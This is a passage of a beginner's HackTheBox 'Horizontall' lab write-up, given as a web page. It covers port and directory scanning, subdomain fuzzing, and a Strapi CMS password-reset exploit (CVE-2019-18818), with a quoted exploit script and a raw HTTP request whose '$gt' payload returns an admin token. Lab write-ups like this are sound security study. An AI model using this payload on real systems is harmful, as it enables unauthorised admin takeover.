@@ -1,0 +1,545 @@
+<!doctype html><html lang=en-us>
+<head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Horizontall 
+Intro Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &amp;lsquo;real&amp;rsquo; challenge. Although it is rated &amp;lsquo;Easy&amp;rsquo;, I had to apply all of my current knowledge to snag both flags. Let&amp;rsquo;s crack straight into it!
+Reconnaissance Machine tags:
+ Linux CMS Exploit Outdated Software CVE Injection RCE Account Misconfiguration  The tags on the machine alone gives us a pretty good idea of what we&amp;rsquo;ll be up against."><title>HackTheBox: Horizontall</title>
+<link rel=canonical href=https://weaponizedpeach.github.io/p/hackthebox-horizontall/>
+<link rel=stylesheet href=/scss/style.min.5f343aefda6021d7c99a35d0d8a06abdad13d86982967b5b28f1008e404a346d.css><meta property="og:title" content="HackTheBox: Horizontall">
+<meta property="og:description" content="Horizontall 
+Intro Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &amp;lsquo;real&amp;rsquo; challenge. Although it is rated &amp;lsquo;Easy&amp;rsquo;, I had to apply all of my current knowledge to snag both flags. Let&amp;rsquo;s crack straight into it!
+Reconnaissance Machine tags:
+ Linux CMS Exploit Outdated Software CVE Injection RCE Account Misconfiguration  The tags on the machine alone gives us a pretty good idea of what we&amp;rsquo;ll be up against.">
+<meta property="og:url" content="https://weaponizedpeach.github.io/p/hackthebox-horizontall/">
+<meta property="og:site_name" content="WeaponizedPeach >> Infosec">
+<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:published_time" content="2022-02-05T20:55:12+02:00"><meta property="article:modified_time" content="2022-02-05T20:55:12+02:00">
+<meta name=twitter:title content="HackTheBox: Horizontall">
+<meta name=twitter:description content="Horizontall 
+Intro Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &amp;lsquo;real&amp;rsquo; challenge. Although it is rated &amp;lsquo;Easy&amp;rsquo;, I had to apply all of my current knowledge to snag both flags. Let&amp;rsquo;s crack straight into it!
+Reconnaissance Machine tags:
+ Linux CMS Exploit Outdated Software CVE Injection RCE Account Misconfiguration  The tags on the machine alone gives us a pretty good idea of what we&amp;rsquo;ll be up against.">
+<link rel="shortcut icon" href=favicon.ico>
+</head>
+<body class="article-page has-toc">
+<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
+<div class="container main-container flex
+extended">
+<div id=article-toolbar>
+<a href=/ class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
+<span>Back</span>
+</a>
+</div>
+<main class="main full-width">
+<article class=main-article>
+<header class=article-header>
+<div class=article-details>
+<header class=article-category>
+<a href=/categories/htb/>
+HTB
+</a>
+<a href=/categories/writeup/>
+Writeup
+</a>
+<a href=/categories/easy/>
+Easy
+</a>
+<a href=/categories/web/>
+Web
+</a>
+<a href=/categories/strapi/>
+Strapi
+</a>
+<a href=/categories/pwnkit/>
+Pwnkit
+</a>
+<a href=/categories/rce/>
+RCE
+</a>
+<a href=/categories/cms/>
+CMS
+</a>
+</header>
+<h2 class=article-title>
+<a href=/p/hackthebox-horizontall/>HackTheBox: Horizontall</a>
+</h2>
+<footer class=article-time>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Feb 05, 2022</time>
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>
+12 minute read
+</time>
+</div>
+</footer>
+</div>
+</header>
+<section class=article-content>
+<p><figure class=gallery-image style=flex-grow:100;flex-basis:240px>
+<a href=/p/hackthebox-horizontall/horizontall.png data-size=300x300>
+<img src=/p/hackthebox-horizontall/horizontall.png width=300 height=300 srcset="/p/hackthebox-horizontall/horizontall_hucabaac7a6e40d6b25ebdf18177d21d86_71191_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/horizontall_hucabaac7a6e40d6b25ebdf18177d21d86_71191_1024x0_resize_box_3.png 1024w" loading=lazy alt=Horizontall>
+</a>
+<figcaption>Horizontall</figcaption>
+</figure></p>
+<h2 id=intro>Intro</h2>
+<p>Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &lsquo;real&rsquo; challenge. Although it is rated &lsquo;Easy&rsquo;, I had to apply all of my current knowledge to snag both flags. Let&rsquo;s crack straight into it!</p>
+<h2 id=reconnaissance>Reconnaissance</h2>
+<p>Machine tags:</p>
+<ul>
+<li>Linux</li>
+<li>CMS Exploit</li>
+<li>Outdated Software</li>
+<li>CVE</li>
+<li>Injection</li>
+<li>RCE</li>
+<li>Account Misconfiguration</li>
+</ul>
+<p>The tags on the machine alone gives us a pretty good idea of what we&rsquo;ll be up against.</p>
+<h2 id=scanning--discovery>Scanning & Discovery</h2>
+<h3 id=nmap>nmap</h3>
+<p>Let&rsquo;s start with a simple <code>nmap</code> scan:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># Nmap 7.92 scan initiated Fri Feb  4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105</span>
+Nmap scan report <span class=k>for</span> 10.10.11.105
+Host is up <span class=o>(</span>0.046s latency<span class=o>)</span>.
+Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+<span class=p>|</span> ssh-hostkey: 
+<span class=p>|</span>   <span class=m>2048</span> ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 <span class=o>(</span>RSA<span class=o>)</span>
+<span class=p>|</span>   <span class=m>256</span> 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 <span class=o>(</span>ECDSA<span class=o>)</span>
+<span class=p>|</span>_  <span class=m>256</span> 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 <span class=o>(</span>ED25519<span class=o>)</span>
+80/tcp open  http    nginx 1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
+<span class=p>|</span>_http-title: Did not follow redirect to http://horizontall.htb
+<span class=p>|</span>_http-server-header: nginx/1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
+No exact OS matches <span class=k>for</span> host <span class=o>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class=o>)</span>.
+TCP/IP fingerprint:
+OS:SCAN<span class=o>(</span><span class=nv>V</span><span class=o>=</span>7.92%E<span class=o>=</span>4%D<span class=o>=</span>2/4%OT<span class=o>=</span>22%CT<span class=o>=</span>1%CU<span class=o>=</span>31967%PV<span class=o>=</span>Y%DS<span class=o>=</span>2%DC<span class=o>=</span>I%G<span class=o>=</span>Y%TM<span class=o>=</span>61FD2C35
+OS:%P<span class=o>=</span>x86_64-pc-linux-gnu<span class=o>)</span>SEQ<span class=o>(</span><span class=nv>SP</span><span class=o>=</span>105%GCD<span class=o>=</span>1%ISR<span class=o>=</span>10B%TI<span class=o>=</span>Z%CI<span class=o>=</span>Z%II<span class=o>=</span>I%TS<span class=o>=</span>A<span class=o>)</span>OPS<span class=o>(</span>
+OS:O1<span class=o>=</span>M505ST11NW7%O2<span class=o>=</span>M505ST11NW7%O3<span class=o>=</span>M505NNT11NW7%O4<span class=o>=</span>M505ST11NW7%O5<span class=o>=</span>M505ST11
+OS:NW7%O6<span class=o>=</span>M505ST11<span class=o>)</span>WIN<span class=o>(</span><span class=nv>W1</span><span class=o>=</span>FE88%W2<span class=o>=</span>FE88%W3<span class=o>=</span>FE88%W4<span class=o>=</span>FE88%W5<span class=o>=</span>FE88%W6<span class=o>=</span>FE88<span class=o>)</span>ECN<span class=o>(</span>
+OS:R<span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%W<span class=o>=</span>FAF0%O<span class=o>=</span>M505NNSNW7%CC<span class=o>=</span>Y%Q<span class=o>=)</span>T1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%S<span class=o>=</span>O%A<span class=o>=</span>S+%F<span class=o>=</span>AS
+OS:%RD<span class=o>=</span>0%Q<span class=o>=)</span>T2<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>T3<span class=o>(</span><span class=nv>R</span><span class=o>=</span>N<span class=o>)</span>T4<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>Z%F<span class=o>=</span>R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T5<span class=o>(</span><span class=nv>R</span><span class=o>=</span>
+OS:Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>S+%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T6<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%W<span class=o>=</span>0%S<span class=o>=</span>A%A<span class=o>=</span>Z%F<span class=o>=</span>
+OS:R%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>T7<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>Y%T<span class=o>=</span>40%W<span class=o>=</span>0%S<span class=o>=</span>Z%A<span class=o>=</span>S+%F<span class=o>=</span>AR%O<span class=o>=</span>%RD<span class=o>=</span>0%Q<span class=o>=)</span>U1<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DF<span class=o>=</span>N%T
+OS:<span class=o>=</span>40%IPL<span class=o>=</span>164%UN<span class=o>=</span>0%RIPL<span class=o>=</span>G%RID<span class=o>=</span>G%RIPCK<span class=o>=</span>G%RUCK<span class=o>=</span>G%RUD<span class=o>=</span>G<span class=o>)</span>IE<span class=o>(</span><span class=nv>R</span><span class=o>=</span>Y%DFI<span class=o>=</span>N%T<span class=o>=</span>40%CD<span class=o>=</span>
+OS:S<span class=o>)</span>
+
+Network Distance: <span class=m>2</span> hops
+Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Takeaway:</p>
+<ul>
+<li><code>nginx</code> web server running on <code>:80</code></li>
+<li><code>OpenSSH 7.6p1</code> SSH server on <code>:22</code></li>
+<li>Ubuntu OS</li>
+</ul>
+<p><code>_http-title: Did not follow redirect to http://horizontall.htb</code></p>
+<p>We can see a redirect to a URL. Let&rsquo;s add it to our /etc/hosts file:</p>
+<p><code>sudo echo "10.10.11.105 horizontall.htb" >> /etc/hosts</code></p>
+<p>I left an all port scan in the background afterwards, but it did not give any additional results.</p>
+<h3 id=whatweb>whatweb</h3>
+<p>Whatweb didn&rsquo;t give us any more information than nmap already did.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>http://horizontall.htb <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>]</span>
+<span class=o>[</span>nginx/1.14.0 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.11.105<span class=o>]</span>, Script, Title<span class=o>[</span>horizontall<span class=o>]</span>,
+X-UA-Compatible<span class=o>[</span><span class=nv>IE</span><span class=o>=</span>edge<span class=o>]</span>, nginx<span class=o>[</span>1.14.0<span class=o>]</span>
+</code></pre></div><h3 id=horizontallhtb>horizontall.htb</h3>
+<p>I connected to this URL and was greeted by this:</p>
+<p><figure class=gallery-image style=flex-grow:137;flex-basis:328px>
+<a href=/p/hackthebox-horizontall/landing.png data-size=965x704>
+<img src=/p/hackthebox-horizontall/landing.png width=965 height=704 srcset="/p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_1024x0_resize_box_3.png 1024w" loading=lazy alt="Landing page">
+</a>
+<figcaption>Landing page</figcaption>
+</figure></p>
+<p>Scrolling down, I noticed what seemed like a contact form of some sort:</p>
+<p><figure class=gallery-image style=flex-grow:222;flex-basis:534px>
+<a href=/p/hackthebox-horizontall/contact_form.png data-size=955x429>
+<img src=/p/hackthebox-horizontall/contact_form.png width=955 height=429 srcset="/p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_1024x0_resize_box_3.png 1024w" loading=lazy alt="Contact form">
+</a>
+<figcaption>Contact form</figcaption>
+</figure></p>
+<p>I did my best attempt at an XSS script, but after writing it I noticed that the &ldquo;Send&rdquo; button has no JS attached to it. So this attack surface, at least, was not likely.</p>
+<p>Next, I decided to try and brute-force some hidden files and directories with gobuster.</p>
+<h3 id=gobuster--horizontallhtb>gobuster @ horizontall.htb</h3>
+<p>I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=o>===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+<span class=o>===============================================================</span>
+<span class=o>[</span>+<span class=o>]</span> Url:                     http://horizontall.htb
+<span class=o>[</span>+<span class=o>]</span> Method:                  GET
+<span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+<span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
+<span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+<span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
+<span class=o>[</span>+<span class=o>]</span> Extensions:              conf,php,txt,asp,aspx
+<span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+<span class=o>===============================================================</span>
+2022/02/04 16:14:11 Starting gobuster in directory enumeration <span class=nv>mode</span>
+<span class=o>===============================================================</span>
+
+/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 194<span class=o>]</span> <span class=o>[</span>--&gt; http://horizontall.htb/css/<span class=o>]</span>
+
+/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4286<span class=o>]</span>                                 
+
+/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 194<span class=o>]</span> <span class=o>[</span>--&gt; http://horizontall.htb/img/<span class=o>]</span>
+
+/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 194<span class=o>]</span> <span class=o>[</span>--&gt; http://horizontall.htb/js/<span class=o>]</span> 
+<span class=o>===============================================================</span>
+2022/02/04 16:28:50 <span class=nv>Finished</span>
+<span class=o>===============================================================</span>
+</code></pre></div><p>I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.</p>
+<h3 id=ssh-service-rabbit-hole>SSH Service (rabbit hole)</h3>
+<p>What caught my eye after the nmap scan, was the <code>OpenSSH 7.6p1</code> version of the SSH service. A quick search on <code>exploit-db.com</code> found multiple possible vulnerabilities. What solidified my belief, was the <code>CVE 2018-15473</code> exploit named <a class=link href=https://www.exploit-db.com/exploits/45233 target=_blank rel=noopener>OpenSSH 2.3 &lt; 7.7 - Username Enumeration</a>. It seemed as though the box&rsquo;s version was succeptible. After attempting both manually running the scripts on <code>exploit-db.com</code> as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.</p>
+<p>As such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.</p>
+<p>Although, the machine had the tag &ldquo;CMS&rdquo;, however we only ever saw a landing page. Is there something we missed? Where is this CMS?</p>
+<h3 id=wfuzz-subdomains>wfuzz subdomains</h3>
+<p>With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing <code>subdomains-top1million-110000.txt</code> wordlist from the <a class=link href=https://github.com/danielmiessler/SecLists target=_blank rel=noopener>SecLists repository</a> that I very much recommend.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>wfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u <span class=s1>&#39;http://horizontall.htb&#39;</span> -H <span class=s2>&#34;Host: FUZZ.horizontall.htb&#34;</span>
+</code></pre></div><p>We found <strong>one</strong> subdomain out of the ~114000 -> <code>api-prod</code></p>
+<p>Let&rsquo;s quickly add it to our hosts file and check it out!</p>
+<p><code>sudo echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts</code></p>
+<h3 id=api-prodhorizontallhtb>api-prod.horizontall.htb</h3>
+<p>Upon connecting, I was greeted with a very underwhelming screen:</p>
+<p><figure class=gallery-image style=flex-grow:356;flex-basis:855px>
+<a href=/p/hackthebox-horizontall/api-prod.png data-size=456x128>
+<img src=/p/hackthebox-horizontall/api-prod.png width=456 height=128 srcset="/p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_1024x0_resize_box_3.png 1024w" loading=lazy alt=api-prod.horizontall.htb>
+</a>
+<figcaption>api-prod.horizontall.htb</figcaption>
+</figure></p>
+<p>The source code did not give any particularly interesting leads, and so, I went for another gobuster run.</p>
+<h3 id=gobuster--api-prodhorizontallhtb>gobuster @ api-prod.horizontall.htb</h3>
+<p>Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, <code>directory-list-2.3-big.txt</code> from the aforementioned SecLists repo.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=o>===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+<span class=o>===============================================================</span>
+<span class=o>[</span>+<span class=o>]</span> Url:                     http://api-prod.horizontall.htb/
+<span class=o>[</span>+<span class=o>]</span> Method:                  GET
+<span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+<span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+<span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+<span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
+<span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+<span class=o>===============================================================</span>
+2022/02/04 17:17:09 Starting gobuster in directory enumeration <span class=nv>mode</span>
+<span class=o>===============================================================</span>
+
+/reviews              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 507<span class=o>]</span>
+
+/users                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 60<span class=o>]</span> 
+
+/admin                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 854<span class=o>]</span>
+</code></pre></div><p>Very quickly, I found some hidden directories and went to check them out.</p>
+<h3 id=api-prodhorizontallhtbreviews>api-prod.horizontall.htb/reviews</h3>
+<p>Even though I was barred from checking out the much more interesting <code>/users</code> endpoint, I wanted to see what <code>/reviews</code> had in store also. Unfortunately, it wasn&rsquo;t anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.</p>
+<p><figure class=gallery-image style=flex-grow:121;flex-basis:292px>
+<a href=/p/hackthebox-horizontall/reviews.png data-size=604x496>
+<img src=/p/hackthebox-horizontall/reviews.png width=604 height=496 srcset="/p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_1024x0_resize_box_3.png 1024w" loading=lazy alt=Reviews>
+</a>
+<figcaption>Reviews</figcaption>
+</figure></p>
+<p><code>/admin</code> seemed like the juiciest bit anyway, so let&rsquo;s go there.</p>
+<h3 id=api-prodhorizontallhtbadmin>api-prod.horizontall.htb/admin</h3>
+<p>My hopes were reignited when I saw this login screen.</p>
+<p><figure class=gallery-image style=flex-grow:150;flex-basis:361px>
+<a href=/p/hackthebox-horizontall/admin_panel.png data-size=777x516>
+<img src=/p/hackthebox-horizontall/admin_panel.png width=777 height=516 srcset="/p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_1024x0_resize_box_3.png 1024w" loading=lazy alt="Strapi CMS Admin Log-in">
+</a>
+<figcaption>Strapi CMS Admin Log-in</figcaption>
+</figure></p>
+<p>Trying out a few commonly used passwords did not prove fruitful. Neither did the &ldquo;Forgot your password?&rdquo; screen.</p>
+<p><figure class=gallery-image style=flex-grow:124;flex-basis:299px>
+<a href=/p/hackthebox-horizontall/forgot_password.png data-size=519x416>
+<img src=/p/hackthebox-horizontall/forgot_password.png width=519 height=416 srcset="/p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_1024x0_resize_box_3.png 1024w" loading=lazy alt="Strapi CMS &lsquo;Forgot your password?'">
+</a>
+<figcaption>Strapi CMS ‘Forgot your password?'</figcaption>
+</figure></p>
+<p>A search on <code>exploit-db.com</code> for <code>strapi CMS</code> returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.</p>
+<p>Before trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.</p>
+<h2 id=exploitation>Exploitation</h2>
+<h3 id=sqlmap-with-burp-suite-rabbit-hole>sqlmap with Burp Suite (rabbit hole)</h3>
+<p>I saved a random login request with Burp for use with sqlmap:</p>
+<pre tabindex=0><code>POST /admin/auth/local HTTP/1.1
+Host: api-prod.horizontall.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://api-prod.horizontall.htb/admin/auth/login
+Content-Type: application/json
+Origin: http://api-prod.horizontall.htb
+Content-Length: 44
+DNT: 1
+Connection: close
+
+{&quot;identifier&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;password&quot;}
+</code></pre><p>However, sqlmap wasn&rsquo;t successful neither with the <code>identifier</code>, nor the <code>password</code> field.</p>
+<p>Welp, time to try out that password reset and those RCEs.</p>
+<h3 id=set-password-unauthenticated>Set Password (Unauthenticated)</h3>
+<p>First of all, I tried <a class=link href=https://www.exploit-db.com/exploits/50237 target=_blank rel=noopener>the password reset exploit</a> (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.</p>
+<p>Unfortunately, the exploit&rsquo;s Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Password reset for user: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>userEmail</span><span class=p>))</span>
+	<span class=n>resetPasswordReq</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=n>userEmail</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>/admin/plugins/users-permissions/auth/reset-password&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>strapiUrl</span><span class=p>)}</span>
+	<span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>/&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>strapiUrl</span><span class=p>),</span> <span class=n>json</span><span class=o>=</span><span class=n>resetPasswordReq</span><span class=p>)</span>
+
+	<span class=c1># Set new password</span>
+	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Setting new password&#34;</span><span class=p>)</span>
+	<span class=n>exploit</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:{},</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=n>newPassword</span><span class=p>,</span> <span class=s2>&#34;passwordConfirmation&#34;</span><span class=p>:</span><span class=n>newPassword</span><span class=p>}</span>
+	<span class=n>r</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>/admin/auth/reset-password&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>strapiUrl</span><span class=p>),</span> <span class=n>json</span><span class=o>=</span><span class=n>exploit</span><span class=p>)</span>
+</code></pre></div><p>The code seems to simply send a specially formatted JSON to the aforementioned &lsquo;Forgot your password?&rsquo; URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the <code>Host:</code> header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:</p>
+<pre tabindex=0><code>POST /admin/auth/reset-password HTTP/1.1
+Host: api-prod.horizontall.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://api-prod.horizontall.htb/admin/auth/login
+Content-Type: application/json
+Origin: http://api-prod.horizontall.htb
+Content-Length: 146
+DNT: 1
+Connection: close
+
+{&quot;code&quot; : {&quot;$gt&quot;:0},
+            &quot;password&quot; : &quot;SuperStrongPassword1&quot;,
+            &quot;passwordConfirmation&quot; : &quot;SuperStrongPassword1&quot;
+            }
+</code></pre><p>I hit send on Burp Suite and cross my fingers&mldr;</p>
+<p>I&rsquo;m met with a <code>200 OK</code> reply! Along with an accompanying <code>JWT</code> token, admin username and email address!</p>
+<pre tabindex=0><code>HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Fri, 04 Feb 2022 17:42:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 249
+Connection: close
+Vary: Origin
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Powered-By: Strapi &lt;strapi.io&gt;
+
+{&quot;jwt&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec&quot;,&quot;user&quot;:{&quot;id&quot;:3,&quot;username&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin@horizontall.htb&quot;,&quot;blocked&quot;:null}}
+</code></pre><p>Let&rsquo;s try that log-in now :3</p>
+<h3 id=admin-log-in--api-prodhorizontallhtbadmin>Admin log-in @ api-prod.horizontall.htb/admin</h3>
+<p>Logging in with the <code>SuperStrongPassword1</code> after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.</p>
+<p><figure class=gallery-image style=flex-grow:174;flex-basis:419px>
+<a href=/p/hackthebox-horizontall/strapi_admin_dashboard.png data-size=1391x796>
